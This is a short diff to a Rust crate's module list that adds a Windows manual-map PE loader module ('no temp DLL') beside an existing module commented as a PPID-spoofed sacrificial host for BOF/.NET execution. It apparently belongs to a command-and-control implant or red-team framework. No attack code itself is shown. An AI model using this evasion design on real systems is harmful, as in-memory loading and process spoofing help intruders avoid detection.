@@ -19,6 +19,7 @@ macro_rules! dbg_print {
 
 pub mod error;
 pub mod types;
+pub mod wire_ids;
 pub mod backoff;
 #[cfg(feature = "ws")]
 pub mod connection;
@@ -66,6 +67,9 @@ pub mod native;
 pub mod module_package;
 #[cfg(feature = "module-loader")]
 pub mod module_loader;
+/// Manual-Map PE loader for L2 modules (no temp DLL).
+#[cfg(all(windows, feature = "mem-map"))]
+pub mod pe_map;
 
 // PPID-spoofed sacrificial host for BOF/.NET
 #[cfg(feature = "isolated-exec")]
